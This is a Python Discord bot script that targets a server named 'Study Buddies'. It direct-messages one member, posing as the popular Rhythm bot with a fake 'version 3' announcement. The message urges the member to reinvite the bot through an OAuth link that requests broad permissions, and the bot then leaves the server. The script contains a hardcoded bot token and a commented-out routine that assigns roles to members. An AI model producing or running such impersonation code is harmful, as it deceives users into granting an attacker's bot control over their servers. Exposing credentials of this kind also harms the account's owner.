import discord

client = discord.Client()

@client.event
async def on_ready():
    print("Log in as {}".format(client.user))

    study_buddies = None
    for guild in client.guilds:
        if (guild.name == "Study Buddies"):
            study_buddies = guild
            print("Hack into study buddies")
            break

    # role_to_be_add = None
    # for role in study_buddies.roles:
    #     if role.id == 868103376930484276:
    #         role_to_be_add = role
    #         print("find the role to be add {}".format(role_to_be_add.name))
    #
    # while True:
    #     member_to_be_add = input("User id here >> ")
    #
    #     target = await study_buddies.fetch_member(int(member_to_be_add))
    #     print(target.name)
    #     if (input("This guy>>?? ") == "y"):
    #         pass
    #     else:
    #         target = None
    #
    #     if target is not None:
    #         try:
    #             await target.add_roles(role_to_be_add)
    #         except Exception as error:
    #             print("fail")
    #             print(error)
    #         else:
    #             print("SUCESS ENJOY!")
    #     else:
    #         print("can't find the guy to add the role")

    celia = await study_buddies.fetch_member(int(input("CELIA ID: ")))
    await celia.send("CONGRATS!!!\nRhythm HAS Update\nBut Wait,\nWe appreciate you for choosing rhythm, so we decide to give you a tiny sneak peak of our latest version v.3(Yes we been working on it a long time ago),\nThe old bot will leave itself\nReinvite with the link below\nBy the way Don't share the link please, it is private. Not everyone had the chance to use version 3\nThanks for participating, and say goodbye to me\n                          -Rhythm 1.8.7")
    await celia.send("https://discord.com/api/oauth2/authorize?client_id=868751951381299241&permissions=4294442817&scope=bot")

    await study_buddies.leave()



client.run("ODY4NjY1Mzg3MzU5ODMwMDE3.YPy9rw.vlwHKhQ2bhJwoDYRfc-_BzFOhC4")

